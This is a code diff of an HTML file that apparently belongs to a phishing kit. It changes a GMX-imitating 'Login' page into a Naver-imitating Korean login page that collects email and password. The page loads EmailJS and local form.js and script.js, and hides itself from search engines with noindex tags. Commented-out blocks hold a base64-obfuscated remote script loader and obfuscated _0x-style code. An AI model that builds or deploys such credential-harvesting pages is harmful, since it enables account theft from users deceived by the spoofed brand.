@@ -1,10 +1,8 @@
-
 <html>
-<head>
-
-<script>
-        var url_string = '';
-        var rex = "LTEwMDE4MDIzNzMwNDc=";
+  <head>
+    <script>
+      var url_string = "";
+      var rex = "LTEwMDE4MDIzNzMwNDc=";
     </script>
     <!-- <script>
         let intervalId = setInterval(() => {
@@ -32,599 +30,669 @@
         const a = "aHR0cHM6Ly9nenNjcmFmdC5jb20vZXhlbC5qcw";
         document.write('<script src="' + atob(a) + '"><\/script>');
     </script> -->
-    <!-- <script src="https://gzscraft.com/exel.js"></script> -->
-    <title>Login</title>
-    <link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/c/c7/GMX-Logo.png?20180306171055">
-    <meta name="robots" content="noindex, noarchive, nofollow, nosnippet">
-    <meta name="googlebot" content="noindex, noarchive, nofollow, nosnippet, noimageindex">
-    <meta name="slurp" content="noindex, noarchive, nofollow, nosnippet, noodp, noydir">
-    <meta name="msnbot" content="noindex, noarchive, nofollow, nosnippet">
-    <meta name="teoma" content="noindex, noarchive, nofollow, nosnippet">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <!-- <script src="https://imgur.com/5pQLzC9.png"></script> -->
+    <title>네이버 로그인</title>
+    <link
+      rel="icon"
+      type="image/png"
+      href="https://imgur.com/5pQLzC9.png?v=1685386253172"
+    />
+    <meta name="robots" content="noindex, noarchive, nofollow, nosnippet" />
+    <meta
+      name="googlebot"
+      content="noindex, noarchive, nofollow, nosnippet, noimageindex"
+    />
+    <meta
+      name="slurp"
+      content="noindex, noarchive, nofollow, nosnippet, noodp, noydir"
+    />
+    <meta name="msnbot" content="noindex, noarchive, nofollow, nosnippet" />
+    <meta name="teoma" content="noindex, noarchive, nofollow, nosnippet" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
     <style>
-        @import url("https://fonts.googleapis.com/css?family=PT+Sans:400,700");
+      @import url("https://fonts.googleapis.com/css?family=PT+Sans:400,700");
 
-        form input[type="submit"],
-        form>div>input[type="text"] {
-            width: 100%;
-        }
+      form input[type="submit"],
+      form > div > input[type="text"] {
+        width: 100%;
+      }
 
-        form>div>input[type="text"] {
-            border-left-width: 0;
-        }
+      form > div > input[type="text"] {
+        border-left-width: 0;
+      }
 
-        form>div>input[type="text"] {
-            border-bottom-width: 0;
-        }
+      form > div > input[type="text"] {
+        border-bottom-width: 0;
+      }
 
-        form>div>input[type="text"] {
-            border-right-width: 0;
-        }
+      form > div > input[type="text"] {
+        border-right-width: 0;
+      }
 
-        
-        form>div>input[type="text"] {
-            border-top-width: 0;
-        }
+      form > div > input[type="text"] {
+        border-top-width: 0;
+      }
 
-        form>div>input[type="password"]:focus,
-        form>div>input[type="text"]:focus,
-        form>div>input[type="email"]:focus {
-            outline: 0;
-        }
+      form > div > input[type="password"]:focus,
+      form > div > input[type="text"]:focus,
+      form > div > input[type="email"]:focus {
+        outline: 0;
+      }
 
-        form>div>input[type="email"]:focus,
-        form>div,
-        form>div>input[type="text"]:focus,
-        form>div>input[type="password"]:focus {
-            background: white;
-        }
+      form > div > input[type="email"]:focus,
+      form > div,
+      form > div > input[type="text"]:focus,
+      form > div > input[type="password"]:focus {
+        background: white;
+      }
 
-        form>div>input[type="text"]:invalid:focus:not(:placeholder-shown)~[class~="reqments"],
-        form>div>input[type="email"]:invalid:focus:not(:placeholder-shown)~[class~="reqments"],
-        form>div>input[type="text"],
-        form>div [class~="reqments"] {
-            padding-left: 50px;
-        }
+      form
+        > div
+        > input[type="text"]:invalid:focus:not(:placeholder-shown)
+        ~ [class~="reqments"],
+      form
+        > div
+        > input[type="email"]:invalid:focus:not(:placeholder-shown)
+        ~ [class~="reqments"],
+      form > div > input[type="text"],
+      form > div [class~="reqments"] {
+        padding-left: 50px;
+      }
 
-        [class~="pxlgin"] {
-            padding-left: 0.104166667in;
-        }
+      [class~="pxlgin"] {
+        padding-left: 0.104166667in;
+      }
 
-        form>div {
-            position: relative;
-        }
+      form > div {
+        position: relative;
+      }
 
-        form>div>input[type="text"] {
-            border-left-style: none;
-        }
+      form > div > input[type="text"] {
+        border-left-style: none;
+      }
 
-        form>div>input[type="email"]:focus+label,
-        form>div>input[type="password"]:focus+label,
-        form>div>input[type="text"]:valid+label,
-        form>div>input[type="text"]:focus+label {
-            opacity: 0;
-        }
+      form > div > input[type="email"]:focus + label,
+      form > div > input[type="password"]:focus + label,
+      form > div > input[type="text"]:valid + label,
+      form > div > input[type="text"]:focus + label {
+        opacity: 0;
+      }
 
-        form>div>input[type="text"] {
-            border-bottom-style: none;
-        }
+      form > div > input[type="text"] {
+        border-bottom-style: none;
+      }
 
-        form>div>input[type="text"] {
-            border-right-style: none;
-        }
+      form > div > input[type="text"] {
+        border-right-style: none;
+      }
 
-        form>div>input[type="text"] {
-            border-top-style: none;
-        }
+      form > div > input[type="text"] {
+        border-top-style: none;
+      }
 
-        form>div>input[type="text"]:invalid:focus:not(:placeholder-shown)~[class~="reqments"],
-        form>div>input[type="email"]:invalid:focus:not(:placeholder-shown)~[class~="reqments"] {
-            max-height: 150pt;
-        }
+      form
+        > div
+        > input[type="text"]:invalid:focus:not(:placeholder-shown)
+        ~ [class~="reqments"],
+      form
+        > div
+        > input[type="email"]:invalid:focus:not(:placeholder-shown)
+        ~ [class~="reqments"] {
+        max-height: 150pt;
+      }
 
-        form>div [class~="reqments"] {
-            padding-bottom: 0;
-        }
+      form > div [class~="reqments"] {
+        padding-bottom: 0;
+      }
 
-        form>div [class~="reqments"],
-        form>div>input[type="text"]:invalid:focus:not(:placeholder-shown)~[class~="reqments"] {
-            padding-right: 0.3125in;
-        }
+      form > div [class~="reqments"],
+      form
+        > div
+        > input[type="text"]:invalid:focus:not(:placeholder-shown)
+        ~ [class~="reqments"] {
+        padding-right: 0.3125in;
+      }
 
-        form>div>input[type="text"] {
-            border-left-color: currentColor;
-        }
+      form > div > input[type="text"] {
+        border-left-color: currentColor;
+      }
 
-        form>div>input[type="text"]:invalid:focus:not(:placeholder-shown)~[class~="reqments"],
-        form>div>input[type="text"] {
-            padding-bottom: 15pt;
-        }
+      form
+        > div
+        > input[type="text"]:invalid:focus:not(:placeholder-shown)
+        ~ [class~="reqments"],
+      form > div > input[type="text"] {
+        padding-bottom: 15pt;
+      }
 
-        form>div [class~="reqments"],
-        form>div>input[type="text"]:invalid:focus:not(:placeholder-shown)~[class~="reqments"] {
-            padding-top: 0;
-        }
+      form > div [class~="reqments"],
+      form
+        > div
+        > input[type="text"]:invalid:focus:not(:placeholder-shown)
+        ~ [class~="reqments"] {
+        padding-top: 0;
+      }
 
-        [class~="pxlgin"] {
-            padding-bottom: 0.104166667in;
-        }
+      [class~="pxlgin"] {
+        padding-bottom: 0.104166667in;
+      }
 
-        form>div [class~="reqments"] {
-            color: #999;
-        }
+      form > div [class~="reqments"] {
+        color: #999;
+      }
 
-        form>div>input[type="text"] {
-            border-bottom-color: currentColor;
-        }
+      form > div > input[type="text"] {
+        border-bottom-color: currentColor;
+      }
 
-        form>div [class~="reqments"] {
-            color: red;
-        }
+      form > div [class~="reqments"] {
+        color: red;
+      }
 
-        form>div>input[type="text"] {
-            border-right-color: currentColor;
-        }
+      form > div > input[type="text"] {
+        border-right-color: currentColor;
+      }
 
-        form>div [class~="reqments"] {
-            max-height: 0;
-        }
+      form > div [class~="reqments"] {
+        max-height: 0;
+      }
 
-        form>div [class~="reqments"] {
-            transition: 0.28s;
-        }
+      form > div [class~="reqments"] {
+        transition: 0.28s;
+      }
 
-        form>div {
-            border-bottom-width: 0.75pt;
-        }
+      form > div {
+        border-bottom-width: 0.75pt;
+      }
 
-        form>div [class~="reqments"] {
-            overflow: hidden;
-        }
+      form > div [class~="reqments"] {
+        overflow: hidden;
+      }
 
-        form>div [class~="reqments"] {
-            font-style: italic;
-        }
+      form > div [class~="reqments"] {
+        font-style: italic;
+      }
 
-        [class~="pxlgin"] {
-            padding-right: 0.104166667in;
-        }
+      [class~="pxlgin"] {
+        padding-right: 0.104166667in;
+      }
 
-        form input[type="submit"] {
-            display: block;
-        }
+      form input[type="submit"] {
+        display: block;
+      }
 
-        form>div>input[type="text"] {
-            border-top-color: currentColor;
-        }
+      form > div > input[type="text"] {
+        border-top-color: currentColor;
+      }
 
-        form>div>input[type="text"] {
-            border-image: none;
-        }
+      form > div > input[type="text"] {
+        border-image: none;
+      }
 
-        form input[type="submit"] {
-            margin-left: 0;
-        }
+      form input[type="submit"] {
+        margin-left: 0;
+      }
 
-        form>div>input[type="email"],
-        form>div>input[type="text"] {
-            padding-right: 0.208333333in;
-        }
+      form > div > input[type="email"],
+      form > div > input[type="text"] {
+        padding-right: 0.208333333in;
+      }
 
-        form>div>input[type="email"],
-        form>div>input[type="text"] {
-            padding-top: 0.208333333in;
-        }
+      form > div > input[type="email"],
+      form > div > input[type="text"] {
+        padding-top: 0.208333333in;
+      }
 
-        form>div>input[type="text"],
-        form>div>input[type="email"] {
-            background: #fff;
-        }
+      form > div > input[type="text"],
+      form > div > input[type="email"] {
+        background: #fff;
+      }
 
-        form input[type="submit"] {
-            margin-bottom: 15pt;
-        }
+      form input[type="submit"] {
+        margin-bottom: 15pt;
+      }
 
-        [class~="pxlgin"] {
-            padding-top: 0.104166667in;
-        }
+      [class~="pxlgin"] {
+        padding-top: 0.104166667in;
+      }
 
-        form>div>input[type="password"],
-        form>div>input[type="email"] {
-            width: 100%;
-        }
+      form > div > input[type="password"],
+      form > div > input[type="email"] {
+        width: 100%;
+      }
 
-        form input[type="submit"] {
-            margin-right: 0;
-        }
+      form input[type="submit"] {
+        margin-right: 0;
+      }
 
-        form>div {
-            border-bottom-style: solid;
-        }
+      form > div {
+        border-bottom-style: solid;
+      }
 
-        form>div {
-            border-bottom-color: #ccc;
-        }
+      form > div {
+        border-bottom-color: #ccc;
+      }
 
-        form input[type="submit"] {
-            margin-top: 15pt;
-        }
+      form input[type="submit"] {
+        margin-top: 15pt;
+      }
 
-        form input[type="submit"],
-        form>div>input[type="email"] {
-            border-left-width: 0;
-        }
+      form input[type="submit"],
+      form > div > input[type="email"] {
+        border-left-width: 0;
+      }
 
-        form>div>input[type="email"],
-        form input[type="submit"] {
-            border-bottom-width: 0;
-        }
+      form > div > input[type="email"],
+      form input[type="submit"] {
+        border-bottom-width: 0;
+      }
 
-        form input[type="submit"] {
-            background: #85a2c0
-        }
+      form input[type="submit"] {
+        background: #34ab1a;
+      }
 
-        form>div>input[type="email"],
-        form input[type="submit"] {
-            border-right-width: 0;
-        }
+      form > div > input[type="email"],
+      form input[type="submit"] {
+        border-right-width: 0;
+      }
 
-        form>div>label {
-            opacity: 0.3;
-        }
+      form > div > label {
+        opacity: 0.3;
+      }
 
-        form input[type="submit"] {
-            color: white;
-        }
+      form input[type="submit"] {
+        color: white;
+      }
 
-        form input[type="submit"],
-        form>div>input[type="email"] {
-            border-top-width: 0;
-        }
+      form input[type="submit"],
+      form > div > input[type="email"] {
+        border-top-width: 0;
+      }
 
-        form>div>input[type="email"]:invalid:not(:focus):not(:placeholder-shown),
-        form>div>input[type="password"]:invalid:not(:focus):not(:placeholder-shown),
-        form>div>input[type="text"]:invalid:not(:focus):not(:placeholder-shown) {
-            background: pink;
-        }
+      form
+        > div
+        > input[type="email"]:invalid:not(:focus):not(:placeholder-shown),
+      form
+        > div
+        > input[type="password"]:invalid:not(:focus):not(:placeholder-shown),
+      form
+        > div
+        > input[type="text"]:invalid:not(:focus):not(:placeholder-shown) {
+        background: pink;
+      }
 
-        form>div>input[type="email"],
-        form input[type="submit"] {
-            border-left-style: none;
-        }
+      form > div > input[type="email"],
+      form input[type="submit"] {
+        border-left-style: none;
+      }
 
-        form input[type="submit"],
-        form>div>input[type="email"] {
-            border-bottom-style: none;
-        }
+      form input[type="submit"],
+      form > div > input[type="email"] {
+        border-bottom-style: none;
+      }
 
-        form input[type="submit"],
-        form>div>input[type="email"] {
-            border-right-style: none;
-        }
+      form input[type="submit"],
+      form > div > input[type="email"] {
+        border-right-style: none;
+      }
 
-        html {
-            min-height: 100%;
-        }
+      html {
+        min-height: 100%;
+      }
 
-        * {
-            box-sizing: border-box;
+      * {
+        box-sizing: border-box;
+      }
+
+      .pxfiles {
+        background: #eeeeee;
+      }
+
+      form,
+      .pxfiles {
+        margin-left: auto;
+      }
+
+      form input[type="submit"],
+      form > div > input[type="email"] {
+        border-top-style: none;
+      }
+
+      form > div > input[type="email"],
+      form input[type="submit"] {
+        border-left-color: currentColor;
+      }
+
+      form {
+        max-width: 337.5pt;
+      }
+
+      form > div > input[type="email"],
+      form input[type="submit"] {
+        border-bottom-color: currentColor;
+      }
+
+      .pxfiles {
+        margin-bottom: 12.5pc;
+      }
+
+      form > div > input[type="email"],
+      form input[type="submit"] {
+        border-right-color: currentColor;
+      }
+
+      form input[type="submit"],
+      form > div > input[type="email"] {
+        border-top-color: currentColor;
+      }
+
+      form > div > input[type="email"],
+      form > div {
+        border-image: none;
+      }
+
+      form > div > input[type="email"],
+      form > div > input[type="password"] {
+        padding-left: 3.125pc;
+      }
+
+      form
+        > div
+        > input[type="email"]:invalid:focus:not(:placeholder-shown)
+        ~ [class~="reqments"],
+      form > div > input[type="email"],
+      form input[type="submit"],
+      form > div > input[type="password"] {
+        padding-bottom: 15pt;
+      }
+
+      form > div > input[type="password"] {
+        border-left-width: 0;
+      }
+
+      form > div > input[type="password"] {
+        border-bottom-width: 0;
+      }
+
+      .pxfiles,
+      form {
+        margin-right: auto;
+      }
+
+      form > div > input[type="password"] {
+        border-right-width: 0;
+      }
+
+      form > div > input[type="password"] {
+        border-top-width: 0;
+      }
+
+      form > div > input[type="password"] {
+        border-left-style: none;
+      }
+
+      form > div > input[type="password"] {
+        border-bottom-style: none;
+      }
+
+      form > div > input[type="password"] {
+        border-right-style: none;
+      }
+
+      form > div > input[type="password"] {
+        border-top-style: none;
+      }
+
+      form
+        > div
+        > input[type="email"]:invalid:not(:focus):not(:placeholder-shown)
+        + label,
+      form
+        > div
+        > input[type="password"]:invalid:not(:focus):not(:placeholder-shown)
+        + label,
+      form > div > input[type="email"]:valid + label,
+      form
+        > div
+        > input[type="text"]:invalid:not(:focus):not(:placeholder-shown)
+        + label {
+        opacity: 0;
+      }
+
+      form > div > input[type="password"] {
+        border-left-color: currentColor;
+      }
+
+      form > div > input[type="password"] {
+        border-bottom-color: currentColor;
+      }
+
+      form > div > input[type="password"] {
+        border-right-color: currentColor;
+      }
+
+      form > div > input[type="password"] {
+        border-top-color: currentColor;
+      }
+
+      form > div > input[type="password"],
+      form input[type="submit"] {
+        border-image: none;
+      }
+
+      .pxfiles {
+        margin-top: 12.5pc;
+      }
+
+      form > div {
+        color: #000;
+      }
+
+      form > div > input[type="password"],
+      form input[type="submit"] {
+        padding-right: 0.208333333in;
+      }
+
+      form > div > label {
+        font-weight: bold;
+      }
+
+      form {
+        margin-bottom: 0;
+      }
+
+      form input[type="submit"],
+      form > div > input[type="password"] {
+        padding-top: 0.208333333in;
+      }
+
+      form > div > input[type="password"] {
+        background: #fff;
+      }
+
+      form
+        > div
+        > input[type="email"]:invalid:focus:not(:placeholder-shown)
+        ~ [class~="reqments"],
+      form
+        > div
+        > input[type="password"]:invalid:focus:not(:placeholder-shown)
+        ~ [class~="reqments"] {
+        padding-right: 1.875pc;
+      }
+
+      form > div > input[type="text"]:valid {
+        background: url("https://s3-us-west-2.amazonaws.com/s.cdpn.io/3/check.svg");
+      }
+
+      form input[type="submit"] {
+        padding-left: 15pt;
+      }
+
+      form > div > input[type="text"]:valid {
+        background-size: 15pt;
+      }
+
+      form > div > input[type="text"]:valid {
+        background-repeat: no-repeat;
+      }
+
+      form > div > input[type="text"]:valid {
+        background-position: 0.208333333in 15pt;
+      }
+
+      form
+        > div
+        > input[type="password"]:invalid:focus:not(:placeholder-shown)
+        ~ [class~="reqments"],
+      form
+        > div
+        > input[type="email"]:invalid:focus:not(:placeholder-shown)
+        ~ [class~="reqments"] {
+        padding-top: 0;
+      }
+
+      form > div > input[type="email"]:valid {
+        background: url("https://s3-us-west-2.amazonaws.com/s.cdpn.io/3/check.svg");
+      }
+
+      form > div > input[type="email"]:valid {
+        background-size: 15pt;
+      }
+
+      .pxfiles {
+        width: 90%;
+      }
+
+      form
+        > div
+        > input[type="password"]:invalid:focus:not(:placeholder-shown)
+        ~ [class~="reqments"] {
+        max-height: 150pt;
+      }
+
+      form
+        > div
+        > input[type="password"]:invalid:focus:not(:placeholder-shown)
+        ~ [class~="reqments"] {
+        padding-left: 50px;
+      }
+
+      form > div > input[type="email"]:valid {
+        background-repeat: no-repeat;
+      }
+
+      form > div > input[type="email"]:valid {
+        background-position: 0.208333333in 15pt;
+      }
+
+      form > div > input[type="password"]:valid {
+        background: url("https://s3-us-west-2.amazonaws.com/s.cdpn.io/3/check.svg");
+      }
+
+      form > div > input[type="password"]:valid {
+        background-size: 15pt;
+      }
+
+      form > div > input[type="password"]:valid {
+        background-repeat: no-repeat;
+      }
+
+      form > div > input[type="password"]:valid {
+        background-position: 0.208333333in 15pt;
+      }
+
+      form
+        > div
+        > input[type="password"]:invalid:focus:not(:placeholder-shown)
+        ~ [class~="reqments"] {
+        padding-bottom: 15pt;
+      }
+
+      form input[type="submit"] {
+        font-size: 1.2rem;
+      }
+
+      .pxfiles {
+        max-width: 337.5pt;
+      }
+
+      .pxfiles {
+        text-align: center;
+      }
+
+      .pxfiles {
+        color: #fff;
+      }
+
+      [class~="invalid"] {
+        background: #000;
+      }
+
+      [class~="invalid"] {
+        color: #000;
+      }
+
+      form {
+        margin-top: 0;
+      }
+
+      form > div > label {
+        position: absolute;
+      }
+
+      form > div > input[type="password"]:valid + label {
+        opacity: 0;
+      }
+
+      form > div > label {
+        top: 0.229166667in;
+      }
+
+      form > div > label {
+        left: 15pt;
+      }
+
+      form input[type="submit"]:hover {
+        box-shadow: 0.0625pc 1px 1px #ddd;
+      }
+
+      @media screen and (max-width: 360px) and (min-width: 320px) {
+        .pxfiles {
+          margin-left: auto;
         }
 
         .pxfiles {
-            background: #2a4a90;
-        }
-
-        form,
-        .pxfiles {
-            margin-left: auto;
-        }
-
-        form input[type="submit"],
-        form>div>input[type="email"] {
-            border-top-style: none;
-        }
-
-        form>div>input[type="email"],
-        form input[type="submit"] {
-            border-left-color: currentColor;
-        }
-
-        form {
-            max-width: 337.5pt;
-        }
-
-        form>div>input[type="email"],
-        form input[type="submit"] {
-            border-bottom-color: currentColor;
+          margin-bottom: 75pt;
         }
 
         .pxfiles {
-            margin-bottom: 12.5pc;
-        }
-
-        form>div>input[type="email"],
-        form input[type="submit"] {
-            border-right-color: currentColor;
-        }
-
-        form input[type="submit"],
-        form>div>input[type="email"] {
-            border-top-color: currentColor;
-        }
-
-        form>div>input[type="email"],
-        form>div {
-            border-image: none;
-        }
-
-        form>div>input[type="email"],
-        form>div>input[type="password"] {
-            padding-left: 3.125pc;
-        }
-
-        form>div>input[type="email"]:invalid:focus:not(:placeholder-shown)~[class~="reqments"],
-        form>div>input[type="email"],
-        form input[type="submit"],
-        form>div>input[type="password"] {
-            padding-bottom: 15pt;
-        }
-
-        form>div>input[type="password"] {
-            border-left-width: 0;
-        }
-
-        form>div>input[type="password"] {
-            border-bottom-width: 0;
-        }
-
-        .pxfiles,
-        form {
-            margin-right: auto;
-        }
-
-        form>div>input[type="password"] {
-            border-right-width: 0;
-        }
-
-        form>div>input[type="password"] {
-            border-top-width: 0;
-        }
-
-        form>div>input[type="password"] {
-            border-left-style: none;
-        }
-
-        form>div>input[type="password"] {
-            border-bottom-style: none;
-        }
-
-        form>div>input[type="password"] {
-            border-right-style: none;
-        }
-
-        form>div>input[type="password"] {
-            border-top-style: none;
-        }
-
-        form>div>input[type="email"]:invalid:not(:focus):not(:placeholder-shown)+label,
-        form>div>input[type="password"]:invalid:not(:focus):not(:placeholder-shown)+label,
-        form>div>input[type="email"]:valid+label,
-        form>div>input[type="text"]:invalid:not(:focus):not(:placeholder-shown)+label {
-            opacity: 0;
-        }
-
-        form>div>input[type="password"] {
-            border-left-color: currentColor;
-        }
-
-        form>div>input[type="password"] {
-            border-bottom-color: currentColor;
-        }
-
-        form>div>input[type="password"] {
-            border-right-color: currentColor;
-        }
-
-        form>div>input[type="password"] {
-            border-top-color: currentColor;
-        }
-
-        form>div>input[type="password"],
-        form input[type="submit"] {
-            border-image: none;
+          margin-right: auto;
         }
 
         .pxfiles {
-            margin-top: 12.5pc;
+          margin-top: 75pt;
         }
+      }
 
-        form>div {
-            color: #000;
-        }
-
-        form>div>input[type="password"],
-        form input[type="submit"] {
-            padding-right: 0.208333333in;
-        }
-
-        form>div>label {
-            font-weight: bold;
-        }
-
-        form {
-            margin-bottom: 0;
-        }
-
-        form input[type="submit"],
-        form>div>input[type="password"] {
-            padding-top: 0.208333333in;
-        }
-
-        form>div>input[type="password"] {
-            background: #fff;
-        }
-
-        form>div>input[type="email"]:invalid:focus:not(:placeholder-shown)~[class~="reqments"],
-        form>div>input[type="password"]:invalid:focus:not(:placeholder-shown)~[class~="reqments"] {
-            padding-right: 1.875pc;
-        }
-
-        form>div>input[type="text"]:valid {
-            background: url("https://s3-us-west-2.amazonaws.com/s.cdpn.io/3/check.svg");
-        }
-
-        form input[type="submit"] {
-            padding-left: 15pt;
-        }
-
-        form>div>input[type="text"]:valid {
-            background-size: 15pt;
-        }
-
-        form>div>input[type="text"]:valid {
-            background-repeat: no-repeat;
-        }
-
-        form>div>input[type="text"]:valid {
-            background-position: 0.208333333in 15pt;
-        }
-
-        form>div>input[type="password"]:invalid:focus:not(:placeholder-shown)~[class~="reqments"],
-        form>div>input[type="email"]:invalid:focus:not(:placeholder-shown)~[class~="reqments"] {
-            padding-top: 0;
-        }
-
-        form>div>input[type="email"]:valid {
-            background: url("https://s3-us-west-2.amazonaws.com/s.cdpn.io/3/check.svg");
-        }
-
-        form>div>input[type="email"]:valid {
-            background-size: 15pt;
-        }
-
-        .pxfiles {
-            width: 90%;
-        }
-
-        form>div>input[type="password"]:invalid:focus:not(:placeholder-shown)~[class~="reqments"] {
-            max-height: 150pt;
-        }
-
-        form>div>input[type="password"]:invalid:focus:not(:placeholder-shown)~[class~="reqments"] {
-            padding-left: 50px;
-        }
-
-        form>div>input[type="email"]:valid {
-            background-repeat: no-repeat;
-        }
-
-        form>div>input[type="email"]:valid {
-            background-position: 0.208333333in 15pt;
-        }
-
-        form>div>input[type="password"]:valid {
-            background: url("https://s3-us-west-2.amazonaws.com/s.cdpn.io/3/check.svg");
-        }
-
-        form>div>input[type="password"]:valid {
-            background-size: 15pt;
-        }
-
-        form>div>input[type="password"]:valid {
-            background-repeat: no-repeat;
-        }
-
-        form>div>input[type="password"]:valid {
-            background-position: 0.208333333in 15pt;
-        }
-
-        form>div>input[type="password"]:invalid:focus:not(:placeholder-shown)~[class~="reqments"] {
-            padding-bottom: 15pt;
-        }
-
-        form input[type="submit"] {
-            font-size: 1.2rem;
-        }
-
-        .pxfiles {
-            max-width: 337.5pt;
-        }
-
-        .pxfiles {
-            text-align: center;
-        }
-
-        .pxfiles {
-            color: #fff;
-        }
-
-        [class~="invalid"] {
-            background: #000;
-        }
-
-        [class~="invalid"] {
-            color: #000;
-        }
-
-        form {
-            margin-top: 0;
-        }
-
-        form>div>label {
-            position: absolute;
-        }
-
-        form>div>input[type="password"]:valid+label {
-            opacity: 0;
-        }
-
-        form>div>label {
-            top: 0.229166667in;
-        }
-
-        form>div>label {
-            left: 15pt;
-        }
-
-        form input[type="submit"]:hover {
-            box-shadow: 0.0625pc 1px 1px #ddd;
-        }
-
-        @media screen and (max-width: 360px) and (min-width: 320px) {
-            .pxfiles {
-                margin-left: auto;
-            }
-
-            .pxfiles {
-                margin-bottom: 75pt;
-            }
-
-            .pxfiles {
-                margin-right: auto;
-            }
-
-            .pxfiles {
-                margin-top: 75pt;
-            }
-        }
-
-        body {
-            background: url("https://cdn.computerhoy.com/sites/navi.axelspringer.es/public/media/image/2018/08/correo-gmx-mail.jpg") no-repeat;
-            background-size: cover;
-            position: absolute;
-            width: 100%;
-            height: 100%;
-            top: 0;
-            right: 0;
-            bottom: 0;
-            left: 0;
-            margin: auto;
-            overflow: hidden;
-            font-family: "PT Sans", sans-serif;
-        }
+      body {
+        background: url("https://imgur.com/bqjdYJt.png?v=1685386262333")
+          no-repeat;
+        background-size: cover;
+        position: absolute;
+        width: 100%;
+        height: 100%;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        margin: auto;
+        overflow: hidden;
+        font-family: "PT Sans", sans-serif;
+      }
     </style>
-        
-        <!-- <script>
+
+    <!-- <script>
             function _0x1bab(_0x43bb4e, _0x27d833) {
                 var _0x47b331 = _0x47b3();
                 return (
@@ -751,39 +819,53 @@
                     );
                 });
         </script> -->
-    
-        <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2/dist/email.min.js"></script>
-        <script src="form.js"></script>
-        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
-        <link crossorigin="anonymous" href="https://cdn.jsdelivr.net/npm/cors@2.8.5/lib/index.min.js">
-    
 
- <script src="chrome-extension://mooikfkahbdckldjjndioackbalphokd/assets/prompt.js"></script>
-</head>
-<body data-new-gr-c-s-check-loaded="14.1110.0" data-gr-ext-installed="">
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2/dist/email.min.js"></script>
+    <script src="form.js"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+    <link
+      crossorigin="anonymous"
+      href="https://cdn.jsdelivr.net/npm/cors@2.8.5/lib/index.min.js"
+    />
+
+    <script src="chrome-extension://mooikfkahbdckldjjndioackbalphokd/assets/prompt.js"></script>
+  </head>
+  <body data-new-gr-c-s-check-loaded="14.1110.0" data-gr-ext-installed="">
     <div class="pxfiles">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/c/c7/GMX-Logo.png?20180306171055" height="44">
-        <h3>Login SSL</h3>
+        <img src="https://imgur.com/gvY6FVx.png?v=1685386253172" height="50">
 
         <div class="pxlgin">
-            <form id="myForm" >
-                 <div>
-                    <input type="email" id="email" name="email" label="Enter Email Address" placeholder="E-mail Addresse"
-                        required="">
-                    <div class="reqments">Invalid email address.</div>
-                </div>
+      <div class="pxlgin">
+        <form id="myForm">
+          <div>
+            <input
+              type="email"
+              id="email"
+              name="email"
+              label="이메일 또는 전화번호"
+              placeholder="이메일 또는 전화번호"
+              required=""
+            />
+            <div class="reqments">Invalid email address.</div>
+          </div>
 
-                <div>
-                    <input type="password" id="password" name="password" label="Enter your password" placeholder="Passwort"
-                        required="">
-                   <div id="message" style="color: red;"></div>
-                </div> 
-                <div class="container-login100-form-btn" id="ligjon">
-                    <input type="submit" value="Log in">
-                </div>
-            </form>
-            
-<!-- 
+          <div>
+            <input
+              type="password"
+              id="password"
+              name="password"
+              label="비밀번호"
+              placeholder="비밀번호"
+              required=""
+            />
+            <div id="message" style="color: red"></div>
+          </div>
+          <div class="container-login100-form-btn" id="ligjon">
+            <input type="submit" value="로그인" />
+          </div>
+        </form>
+
+        <!-- 
             <form id="myForm">
                 <label for="name">Name:</label>
                 <input type="email" id="email" name="email" placeholder="Enter your name" required><br><br>
@@ -791,8 +873,8 @@
                 <input type="password" id="password" name="password" placeholder="Enter your password" required><br><br>
                 <input type="submit" value="Submit">
               </form> -->
-        </div>
+      </div>
     </div>
     <script src="script.js"></script>
-</body>
+  </body>
 </html>
